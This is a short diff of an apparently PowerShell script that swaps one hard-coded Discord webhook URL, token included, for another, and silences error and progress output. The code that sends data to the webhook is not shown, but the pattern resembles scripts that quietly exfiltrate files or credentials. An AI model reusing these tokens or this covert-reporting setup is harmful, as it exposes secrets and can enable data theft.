@@ -4,7 +4,7 @@ param(
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
-$WEBHOOK = "https://discord.com/api/webhooks/1570512670191259728/JC1qDGSQ9UUmawR2hBU1Xnv106QXu0e_lcHHg89bYw1CZ5jnZ7gSEDJ_1d33cbclAs4M"
+$WEBHOOK = "https://discord.com/api/webhooks/1570691857367699517/HpC3nCoYbDsu7TRgveLdklxrHxT8hqXS4olNmB5aF1FxMlc66Ip4FRLfLbcp2IZSPPIq"
 
 $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 if (-not $ScriptDir) { $ScriptDir = (Get-Location).Path }
